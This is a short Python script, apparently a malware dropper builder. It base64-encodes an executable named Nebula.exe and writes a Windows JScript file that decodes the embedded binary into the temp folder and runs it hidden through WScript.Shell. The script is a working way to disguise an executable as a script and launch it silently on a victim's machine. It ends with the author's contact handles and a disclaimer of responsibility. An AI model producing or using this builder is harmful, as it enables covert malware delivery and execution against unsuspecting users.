import base64

infile = "Nebula.exe" #your  input file name (same directory)

outfile = "Nebula.js" #your output file name (same directory, has to have .js Extension)

with open(infile, "rb") as f:
    data = f.read() # data string (the data that was read'n from input file)
    encoded = base64.b64encode(data).decode("ascii") 

with open(outfile, "w", encoding="utf-8") as f:
    f.write(
        f"var fso = new ActiveXObject('Scripting.FileSystemObject'); "
        f"var tmp_path = fso.GetSpecialFolder(2) + '\\\\' + fso.GetTempName(); "
        f"tmp_path = tmp_path.replace('.tmp', '.exe'); "
        f"var stream = new ActiveXObject('ADODB.Stream'); "
        f"stream.Open(); stream.Type = 1; stream.Position = 0; "
        f"var xmlObj = new ActiveXObject('MSXml2.DOMDocument');"
        f"var docElement = xmlObj.createElement('Base64Data');"
        f"docElement.dataType = 'bin.base64'; "
        f"docElement.text = \"{encoded}\"; " #encoded base64 data goes here string: {encoded}  
        f"stream.Write(docElement.nodeTypedValue); "
        f"stream.SaveToFile(tmp_path); "
        f"stream.Close(); "
        f"var shell = new ActiveXObject('WScript.Shell');"
        f"shell.run(tmp_path, 0);"
    )

print("Okay, Its Done, My Github: keegan31 //\\ My Discord: yessir063332", outfile)
#IF USED, CREATOR/AUTHOR IS NOT RESPONSIBLE.